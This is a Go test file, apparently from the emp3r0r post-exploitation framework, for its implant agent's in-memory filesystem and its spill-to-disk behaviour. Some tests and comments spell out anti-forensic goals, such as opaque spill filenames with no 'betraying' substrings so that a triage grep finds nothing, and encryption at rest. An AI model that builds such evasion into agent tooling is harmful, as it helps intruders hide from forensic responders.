package util

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// memfs helpers / spill behavior tests.
//
// memfs must never reject content: once the RAM budget is exceeded, entries
// spill to an unmarked temp backing file (like any well-behaved app writing
// to temp), and reads/existence/listing keep working across tiers. The
// backing file must not carry product-identifying names that would betray the
// agent in a forensic sweep.

func resetMemfsState() {
	MemFileLock.Lock()
	defer MemFileLock.Unlock()
	for k := range MemFileMap {
		delete(MemFileMap, k)
	}
	for k := range memSpilled {
		delete(memSpilled, k)
	}
	for k := range memSpillPaths {
		if p := memSpillPaths[k]; p != "" {
			_ = os.Remove(p) // best-effort cleanup of backing files
		}
		delete(memSpillPaths, k)
	}
	memTotalBytes = 0
	if OnMemFSChanged != nil {
		OnMemFSChanged = nil
	}

	// Reset the write-time budget cache so tests observe a fresh computation.
	memfsBudgetCacheMu.Lock()
	memfsBudgetCache = 0
	memfsBudgetCachedAt = time.Time{}
	memfsBudgetCacheMu.Unlock()
}

func memfsSpillKeys() []string {
	MemFileLock.RLock()
	defer MemFileLock.RUnlock()
	var out []string
	for k := range memSpilled {
		out = append(out, k)
	}
	return out
}

// TestMemfsSpillsInsteadOfRejecting is the core behavioral contract: with a
// tiny budget, an oversized write must succeed (data preserved) and older
// entries must have moved to the backing disk.
func TestMemfsSpillsInsteadOfRejecting(t *testing.T) {
	// Deterministic tiny budget for the test.
	origEnv, hadEnv := os.LookupEnv("EMP3R0R_MEMFS_LIMIT")
	os.Setenv("EMP3R0R_MEMFS_LIMIT", "2048")
	defer func() {
		if hadEnv {
			os.Setenv("EMP3R0R_MEMFS_LIMIT", origEnv)
		} else {
			os.Unsetenv("EMP3R0R_MEMFS_LIMIT")
		}
	}()
	resetMemfsState()
	defer resetMemfsState()

	small := bytes.Repeat([]byte{0x41}, 512)
	big := bytes.Repeat([]byte{0x42}, 4096) // > budget

	if err := SaveFileAgent("mem:///a.bin", small, 0o600, StorageMemory); err != nil {
		t.Fatalf("write a.bin: %v", err)
	}
	// Writing a 4KiB entry with a 2KiB budget must succeed (no rejection) and
	// must spill entries until under budget.
	if err := SaveFileAgent("mem:///big.bin", big, 0o600, StorageMemory); err != nil {
		t.Fatalf("oversized memfs write was rejected: %v", err)
	}

	got, err := ReadFileAgent("mem:///big.bin")
	if err != nil || !bytes.Equal(got, big) {
		t.Fatalf("big.bin round-trip failed: err=%v len=%d", err, len(got))
	}
	// At least one of the files must have spilled to disk (RAM budget 2KiB < 512+4096).
	if len(memfsSpillKeys()) == 0 {
		t.Fatal("expected at least one spilled entry with a 2KiB budget")
	}

	// Spilled content must still read back correctly and the namespace must
	// still report the file as present.
	for _, k := range memfsSpillKeys() {
		if !IsFileExist(k) {
			t.Fatalf("spilled file %s not visible to IsFileExist", k)
		}
		if p := memSpillPath(k); p == "" {
			t.Fatalf("spilled key %s has no tracked backing path", k)
		} else if _, err := os.Stat(p); err != nil {
			t.Fatalf("spill backing file for %s missing: %v", k, err)
		}
	}
}

// TestMemfsSpillIsStealthy is the anti-branding contract: spilled backing
// files must live in the plain temp dir under an opaque name with no
// product-identifying prefix, so a triage grep for "emp3r0r" finds nothing.
func TestMemfsSpillIsStealthy(t *testing.T) {
	os.Setenv("EMP3R0R_MEMFS_LIMIT", "1024")
	defer os.Unsetenv("EMP3R0R_MEMFS_LIMIT")
	resetMemfsState()
	defer resetMemfsState()
	SetFileCryptoKey([]byte("12345678901234567890123456789012"))
	defer SetFileCryptoKey(nil)

	for i := 0; i < 4; i++ {
		payload := bytes.Repeat([]byte{byte('s' + i)}, 1024)
		if err := SaveFileAgent(fmt.Sprintf("mem:///stealth_%d.bin", i), payload, 0o600, StorageMemory); err != nil {
			t.Fatal(err)
		}
	}
	spilled := memfsSpillKeys()
	if len(spilled) == 0 {
		t.Skip("no spill happened; nothing to verify")
	}

	tmpBase, err := filepath.EvalSymlinks(os.TempDir())
	if err != nil {
		tmpBase = os.TempDir()
	}
	for _, k := range spilled {
		p := memSpillPath(k)
		if p == "" {
			t.Fatalf("no backing path for %s", k)
		}
		dir, err := filepath.EvalSymlinks(filepath.Dir(p))
		if err != nil {
			dir = filepath.Dir(p)
		}
		if filepath.Clean(dir) != filepath.Clean(tmpBase) {
			t.Fatalf("spill file %s is not directly in temp dir %s", p, tmpBase)
		}
		name := filepath.Base(p)
		for _, bad := range []string{"emp3r0r", "memfs", "agent", "spill", "tmp"} {
			if strings.Contains(strings.ToLower(name), bad) {
				t.Fatalf("spill file name %q contains betraying substring %q", name, bad)
			}
		}
		// Spilled content must be encrypted at rest, not the plaintext.
		raw, err := os.ReadFile(p)
		if err != nil {
			t.Fatalf("read backing: %v", err)
		}
		if bytes.Contains(raw, []byte("ssss")) || bytes.Contains(raw, []byte("tttt")) {
			t.Fatal("plaintext found in spill backing file")
		}
	}
}

// TestMemfsSpillRoundTrip verifies every file (spilled or not) round-trips
// through ReadFileAgent, FileSize, ListMemFiles and LsPath after heavy writes.
func TestMemfsSpillRoundTrip(t *testing.T) {
	os.Setenv("EMP3R0R_MEMFS_LIMIT", "4096")
	defer os.Unsetenv("EMP3R0R_MEMFS_LIMIT")
	resetMemfsState()
	defer resetMemfsState()

	// A set of crypto key exercises the encrypted-at-rest spill path.
	SetFileCryptoKey([]byte("12345678901234567890123456789012"))
	defer SetFileCryptoKey(nil)

	for i := 0; i < 6; i++ {
		payload := bytes.Repeat([]byte{byte('a' + i)}, 2048)
		key := "mem:///file_" + string(rune('a'+i)) + ".bin"
		if err := SaveFileAgent(key, payload, 0o600, StorageMemory); err != nil {
			t.Fatalf("write %s: %v", key, err)
		}
	}
	if len(memfsSpillKeys()) == 0 {
		t.Skip("no spill happened (budget not exceeded); nothing to verify")
	}

	for i := 0; i < 6; i++ {
		payload := bytes.Repeat([]byte{byte('a' + i)}, 2048)
		key := "mem:///file_" + string(rune('a'+i)) + ".bin"
		got, err := ReadFileAgent(key)
		if err != nil {
			t.Fatalf("read %s: %v", key, err)
		}
		if !bytes.Equal(got, payload) {
			t.Fatalf("content mismatch for %s", key)
		}
		if FileSize(key) <= 0 {
			t.Fatalf("FileSize(%s) = %d, want > 0", key, FileSize(key))
		}
		// Stored size may exceed plaintext when a file crypto key is set
		// (AES-GCM adds salt+nonce+tag); it must never be smaller.
		if FileSize(key) < int64(len(payload)) {
			t.Fatalf("FileSize(%s) = %d < payload %d", key, FileSize(key), len(payload))
		}
	}
	// LsPath must report all files with sane sizes.
	data, err := LsPath("mem:///")
	if err != nil {
		t.Fatalf("LsPath: %v", err)
	}
	if !strings.Contains(string(data), "file_") {
		t.Fatalf("LsPath output missing memfs files: %s", data)
	}
}

// TestMemfsDiskStrategyUntouched verifies plain disk writes still bypass the
// memfs tiers and that explicit disk filenames are not treated as memfs.
func TestMemfsDiskStrategyUntouched(t *testing.T) {
	resetMemfsState()
	defer resetMemfsState()
	SetFileCryptoKey(nil)

	disk := filepath.Join(t.TempDir(), "plain.bin")
	content := bytes.Repeat([]byte{0x44}, 4096)
	if err := SaveFileAgent(disk, content, 0o600, StorageDisk); err != nil {
		t.Fatalf("disk write failed: %v", err)
	}
	if _, err := os.Stat(disk); err != nil {
		t.Fatalf("disk file missing: %v", err)
	}
	if IsFileExist("mem:///plain.bin") {
		t.Fatal("disk file leaked into memfs namespace")
	}
}

// TestMemfsRemoveCleansSpill verifies RemoveFileAgent removes both the RAM
// entry and the backing spill file.
func TestMemfsRemoveCleansSpill(t *testing.T) {
	os.Setenv("EMP3R0R_MEMFS_LIMIT", "1024")
	defer os.Unsetenv("EMP3R0R_MEMFS_LIMIT")
	resetMemfsState()
	defer resetMemfsState()
	SetFileCryptoKey([]byte("12345678901234567890123456789012"))
	defer SetFileCryptoKey(nil)

	for i := 0; i < 3; i++ {
		payload := bytes.Repeat([]byte{byte('x' + i)}, 1024)
		if err := SaveFileAgent("mem:///r.bin", payload, 0o600, StorageMemory); err != nil {
			t.Fatal(err)
		}
	}
	spilled := memfsSpillKeys()
	if len(spilled) == 0 {
		t.Skip("no spill; nothing to clean")
	}
	target := spilled[0]
	backing := memSpillPath(target)
	if _, err := os.Stat(backing); err != nil {
		t.Fatalf("spill backing missing before remove: %v", err)
	}
	if err := RemoveFileAgent(target); err != nil {
		t.Fatalf("RemoveFileAgent: %v", err)
	}
	if IsFileExist(target) {
		t.Fatal("file still exists after remove")
	}
	if _, err := os.Stat(backing); !os.IsNotExist(err) {
		t.Fatalf("spill backing file was not cleaned up (err=%v)", err)
	}
	// The path tracking must be dropped too.
	MemFileLock.RLock()
	_, stillTracked := memSpillPaths[target]
	MemFileLock.RUnlock()
	if stillTracked {
		t.Fatal("memSpillPaths still tracks removed key")
	}
}

// TestMemfsBudgetLazyAndCached verifies the RAM budget is derived at write
// time (never at process init), is cached briefly to avoid syscall noise, and
// honors the explicit env override. It does not depend on the host's actual
// free memory (that is platform-dependent), only on the caching mechanics.
func TestMemfsBudgetLazyAndCached(t *testing.T) {
	resetMemfsState()
	defer resetMemfsState()

	// No budget computed before any write.
	memfsBudgetCacheMu.Lock()
	if memfsBudgetCache != 0 || !memfsBudgetCachedAt.IsZero() {
		memfsBudgetCacheMu.Unlock()
		t.Fatal("budget was computed before first write (process-init-like behavior)")
	}
	memfsBudgetCacheMu.Unlock()

	// First call computes and caches.
	b1 := memfsBudgetBytes()
	memfsBudgetCacheMu.Lock()
	if memfsBudgetCache == 0 {
		memfsBudgetCacheMu.Unlock()
		t.Fatal("budget not cached after first computation")
	}
	cachedAt := memfsBudgetCachedAt
	memfsBudgetCacheMu.Unlock()
	if b1 <= 0 {
		t.Fatalf("budget <= 0: %d", b1)
	}

	// A second immediate call must reuse the cache (no recompute timestamp).
	memfsBudgetBytes()
	memfsBudgetCacheMu.Lock()
	same := memfsBudgetCachedAt.Equal(cachedAt)
	memfsBudgetCacheMu.Unlock()
	if !same {
		t.Fatal("budget was recomputed within the cache window")
	}

	// Advancing the clock past the cache interval forces a refresh.
	memfsBudgetCacheMu.Lock()
	memfsBudgetCachedAt = time.Now().Add(-memfsBudgetCacheIntv - time.Second)
	memfsBudgetCacheMu.Unlock()
	_ = memfsBudgetBytes()
	memfsBudgetCacheMu.Lock()
	fresh := memfsBudgetCachedAt.After(cachedAt)
	memfsBudgetCacheMu.Unlock()
	if !fresh {
		t.Fatal("budget was not refreshed after the cache interval expired")
	}

	// Clamping: the computed budget never exceeds the hard ceiling and never
	// drops below the floor, regardless of what availability reports.
	if b1 > memfsBudgetHardMax {
		t.Fatalf("budget %d exceeds hard max %d", b1, memfsBudgetHardMax)
	}
	if b1 < memfsBudgetMin {
		t.Fatalf("budget %d below min %d", b1, memfsBudgetMin)
	}
}

// TestMemfsBudgetEnvOverride verifies EMP3R0R_MEMFS_LIMIT wins over the
// heuristic and that a garbage value falls back to the heuristic.
func TestMemfsBudgetEnvOverride(t *testing.T) {
	resetMemfsState()
	defer resetMemfsState()

	orig, had := os.LookupEnv("EMP3R0R_MEMFS_LIMIT")
	os.Setenv("EMP3R0R_MEMFS_LIMIT", "12345")
	defer func() {
		if had {
			os.Setenv("EMP3R0R_MEMFS_LIMIT", orig)
		} else {
			os.Unsetenv("EMP3R0R_MEMFS_LIMIT")
		}
	}()
	if got := memfsBudgetBytes(); got != 12345 {
		t.Fatalf("env override ignored: got %d, want 12345", got)
	}

	os.Setenv("EMP3R0R_MEMFS_LIMIT", "not-a-number")
	// Cache is fresh from the previous call; force recompute.
	memfsBudgetCacheMu.Lock()
	memfsBudgetCache = 0
	memfsBudgetCachedAt = time.Time{}
	memfsBudgetCacheMu.Unlock()
	if got := memfsBudgetBytes(); got <= 0 || got == 12345 {
		t.Fatalf("garbage env value did not fall back to heuristic: %d", got)
	}
}
